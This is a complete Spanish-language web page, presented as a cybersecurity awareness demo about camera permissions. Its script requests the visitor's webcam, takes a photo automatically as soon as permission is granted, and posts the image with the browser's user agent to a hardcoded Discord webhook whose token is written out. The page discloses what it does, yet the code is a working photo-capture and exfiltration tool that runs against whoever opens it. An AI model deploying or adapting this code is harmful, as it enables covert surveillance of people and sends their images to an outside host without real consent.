<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Demostración: permisos de cámara y privacidad</title>
  <style>
    :root { --bg:#0f172a; --card:#111827; --ink:#e5e7eb; --muted:#94a3b8; --accent:#22c55e; --danger:#ef4444; }
    * { box-sizing: border-box; font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Arial, "Apple Color Emoji", "Segoe UI Emoji"; }
    body { margin: 0; background: linear-gradient(180deg, #0b1022, #0f172a 35%, #0b1022); color: var(--ink); min-height: 100svh; display: grid; place-items: center; padding: 24px; }
    .wrap { width: 100%; max-width: 920px; }
    .card { background: var(--card); border: 1px solid #1f2937; border-radius: 20px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,.35); }
    h1 { margin: 0 0 8px; font-size: clamp(22px, 3.5vw, 32px); }
    p.lead { color: var(--muted); margin: 0 0 16px; }
    .row { display: grid; grid-template-columns: 1fr; gap: 16px; }
    @media (min-width: 880px){ .row{ grid-template-columns: 1.2fr .8fr; } }
    .panel { background:#0b1220; border: 1px solid #1f2937; border-radius:16px; padding:16px; }
    .btn { appearance: none; border: 0; border-radius: 12px; padding: 12px 16px; cursor: pointer; font-weight: 600; color: #00110a; background: var(--accent); box-shadow: 0 6px 16px rgba(34,197,94,.35); transition: transform .08s ease; }
    .btn:active{ transform: translateY(1px) scale(.99); }
    .btn.secondary { background: transparent; color: var(--ink); border:1px solid #334155; box-shadow:none; }
    .btn.danger { background: var(--danger); color: white; box-shadow: 0 6px 16px rgba(239,68,68,.35); }
    .muted { color: var(--muted); font-size: 14px; }
    .log { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; background:#0a0f1d; border:1px dashed #334155; border-radius: 12px; padding: 12px; min-height: 120px; white-space: pre-wrap; }
    video, canvas, img { width: 100%; display: block; border-radius: 12px; background:black; }
    .tag { display:inline-block; border:1px solid #334155; border-radius:999px; padding:6px 10px; font-size:12px; color:var(--muted); margin-right:8px; }
    .warn { border-left: 4px solid #fbbf24; padding-left: 12px; }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <h1>Demostración de ciberseguridad: ¿por qué no aceptar permisos a ciegas?</h1>
      <p class="lead">Esta página pide acceso a tu <strong>cámara</strong>, toma una foto automáticamente al conceder el permiso y la envía a un bot de Discord. Es <em>solo</em> para propósitos educativos.</p>
      <div style="margin: 8px 0 16px;">
        <span class="tag">HTTPS requerido</span>
        <span class="tag">getUserMedia</span>
        <span class="tag">Webhook de Discord</span>
      </div>

      <div class="row">
        <section class="panel">
          <div style="display:flex; gap:12px; flex-wrap: wrap; margin-bottom: 12px;">
            <button id="btn-request" class="btn">Solicitar permiso de cámara</button>
            <button id="btn-cancel" class="btn secondary" title="Detener el stream si está activo">Cancelar cámara</button>
            <button id="btn-send" class="btn" disabled>Reenviar a Discord</button>
            <button id="btn-clear" class="btn danger" title="Borrar foto de la sesión" disabled>Borrar foto</button>
          </div>

          <video id="video" playsinline autoplay muted hidden></video>
          <canvas id="canvas" hidden></canvas>

          <figure id="previewBox" style="display:none; margin:12px 0 0;">
            <figcaption class="muted" id="caption">Vista previa de la captura</figcaption>
            <img id="preview" alt="Vista previa" />
          </figure>
        </section>

        <aside class="panel">
          <h3 style="margin-top:4px">Registro</h3>
          <div id="log" class="log" aria-live="polite"></div>
          <p class="muted warn" style="margin-top:12px;">
            <strong>Importante:</strong> Este ejemplo usa un webhook de Discord directamente en el cliente, lo cual **no es seguro** en un entorno real.
          </p>
        </aside>
      </div>

      <details style="margin-top:16px;">
        <summary>¿Cómo funciona? (explicación para la exposición)</summary>
        <ol>
          <li>La página solicita <code>navigator.mediaDevices.getUserMedia({ video: true })</code>.</li>
          <li>Si aceptas, se inicia el stream, se espera un instante para enfocar y se toma una foto.</li>
          <li>La imagen se envía a un webhook de Discord como archivo adjunto.</li>
          <li>El stream se detiene y se muestra una vista previa local.</li>
        </ol>
      </details>
    </div>
  </div>

  <script>
    const $ = (id) => document.getElementById(id);
    const log = (msg) => { const el = $("log"); el.textContent += `\n${new Date().toLocaleTimeString()} — ${msg}`; el.scrollTop = el.scrollHeight; };

    const video = $("video");
    const canvas = $("canvas");
    const preview = $("preview");
    const previewBox = $("previewBox");

    let stream = null;
    let lastBlob = null;

    function stopStream(){
      if (!stream) return;
      stream.getTracks().forEach(t => t.stop());
      stream = null;
      video.srcObject = null;
      video.hidden = true;
      log("Cámara detenida.");
    }

    async function requestCamera(){
      if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)){
        log("Este navegador no soporta getUserMedia.");
        alert("Tu navegador no soporta acceso a cámara desde la web.");
        return;
      }

      try{
        log("Solicitando permiso de cámara…");
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.srcObject = stream;
        video.hidden = false;
        await video.play();
        log("Permiso concedido. Preparando captura automática…");
        await new Promise(r => setTimeout(r, 650));
        await captureFrame();
      }catch(err){
        log(`Permiso denegado o error: ${err.message}`);
        alert("No se pudo acceder a la cámara. (¿Rechazaste el permiso?)");
      }
    }

    async function captureFrame(){
      if (!video || !video.videoWidth){
        log("Video no listo para capturar.");
        return;
      }
      const w = video.videoWidth;
      const h = video.videoHeight;
      canvas.width = w; canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, w, h);
      stopStream();

      lastBlob = await new Promise(res => canvas.toBlob(res, 'image/png'));
      const url = URL.createObjectURL(lastBlob);
      preview.src = url;
      previewBox.style.display = 'block';
      $("btn-send").disabled = false;
      $("btn-clear").disabled = false;
      log(`Foto capturada (${Math.round(lastBlob.size/1024)} KB).`);
      sendToDiscord();
    }

    async function sendToDiscord(){
      const webhook = "https://discord.com/api/webhooks/1394955639046017125/-WfN_y9umGx0-PV4GP0FID6mSIGq7NPXy6SQO-CmZRA1LOSppZgKX0IJNyKZisgnwqci";
      if (!lastBlob){ log("No hay foto para enviar."); return; }

      try{
        log("Enviando a Discord…");
        const fd = new FormData();
        fd.append('file', lastBlob, `captura-${Date.now()}.png`);
        const payload = {
          content: `\u2705 Nueva captura desde demo web.\nAgente: ${navigator.userAgent}\nHora: ${new Date().toISOString()}`
        };
        fd.append('payload_json', JSON.stringify(payload));
        const res = await fetch(webhook, { method: 'POST', body: fd });
        if (!res.ok){
          const txt = await res.text();
          throw new Error(`HTTP ${res.status}: ${txt.slice(0,160)}`);
        }
        log("Envío completado. Revisa tu canal de Discord.");
      }catch(err){
        log("Error al enviar a Discord: " + err.message);
        alert("No se pudo enviar a Discord. Revisa la consola y el webhook.");
        console.error(err);
      }
    }

    function clearPhoto(){
      lastBlob = null; preview.removeAttribute('src');
      previewBox.style.display = 'none';
      $("btn-send").disabled = true; $("btn-clear").disabled = true;
      log("Foto borrada de la sesión (no del servidor de Discord).");
    }

    $("btn-request").addEventListener('click', requestCamera);
    $("btn-cancel").addEventListener('click', stopStream);
    $("btn-send").addEventListener('click', sendToDiscord);
    $("btn-clear").addEventListener('click', clearPhoto);

    if (navigator.permissions && navigator.permissions.query){
      navigator.permissions.query({ name: 'camera' }).then(status =>{
        log(`Estado de permiso (si el navegador lo soporta): ${status.state}`);
        status.onchange = () => log(`Permiso cambió a: ${status.state}`);
      }).catch(()=>{});
    }
  </script>
</body>
</html>